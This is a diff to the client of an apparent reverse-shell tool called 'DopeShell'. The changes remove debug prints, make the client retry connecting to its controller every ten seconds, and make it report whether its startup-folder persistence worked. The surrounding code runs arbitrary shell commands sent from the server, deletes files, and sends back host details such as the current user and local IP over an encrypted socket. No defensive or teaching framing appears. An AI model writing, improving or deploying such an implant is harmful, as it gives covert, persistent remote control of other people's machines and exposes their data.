@@ -23,9 +23,8 @@ class DopeShellclient:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     def send_data(self, data):
-        print(type(data))
         if (type(data) == str):
-            print('converting to bytes!')
+            # print('converting to bytes!')
             data = data.encode('utf-8')
         encrypted_data = self.encrypt(data)
         # Send the length of the data first
@@ -62,11 +61,12 @@ class DopeShellclient:
             package_name = 'DopeShell'  # Replace with your package name if different
             result = subprocess.run(['pip', 'show', package_name], capture_output=True, text=True)
             package_path = None
+            output = 'unkown error'
             for line in result.stdout.splitlines():
                 if line.startswith('Location:'):
                     package_path = line.split(' ', 1)[1].strip()
                     break
-            
+
             if package_path is None:
                 raise Exception("Failed to determine package path.")
 
@@ -86,13 +86,14 @@ class DopeShellclient:
             with open(batch_file_path, 'w') as batch_file:
                 batch_file.write(batch_content)
 
-            print(f"[*] Persistence established via batch file in startup folder: {batch_file_path}")
+            output =  (f"[*] Persistence established via batch file in startup folder: {batch_file_path}")
 
         except Exception as e:
-            print(f"[-] Failed to establish persistence: {e}")
+            output = (f"[-] Failed to establish persistence: {e}")
+        return output
 
     def execute_command(self, command):
-        invalid = False    
+        invalid = False
         output = b'no error returned'
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         timeout = 5  # seconds
@@ -116,11 +117,20 @@ class DopeShellclient:
         return output
 
     def run(self):
-        self.sock.connect((self.server_ip, self.server_port))
+        while True:
+            try:
+                self.sock.connect((self.server_ip, self.server_port))
+                break
+            except:
+                time.sleep(10)
+                print("could not connect")
+
+
+        
         while True:
             command = self.decrypt(self.sock.recv(4096)).decode('utf-8')
-            print(command)
             if command.lower() == 'exit':
+                self.send_data('exiting')
                 break
 
             elif command.lower() == 'info':
@@ -138,7 +148,6 @@ class DopeShellclient:
                     f"Current User: {getpass.getuser()}\n"
                     f"Local IP Address: {local_ip}\n"
                 )
-                print(type(client_info))
                 self.send_data(client_info)
 
             elif command.lower().startswith('ls'):
@@ -205,7 +214,8 @@ class DopeShellclient:
                 self.send_data(output)
 
             elif command.lower() == 'persist':
-                self.install_persistence()
+                output = self.install_persistence()
+                self.send_data(output)
 
             elif command.lower().startswith('delete'):
                 _, file_path = command.split(' ', 1)
@@ -286,7 +296,6 @@ class DopeShellclient:
 
             else:
                 output = self.execute_command(command)
-                print(type(output))
                 self.send_data(output)
                 # self.sock.send(self.encrypt(output))
 
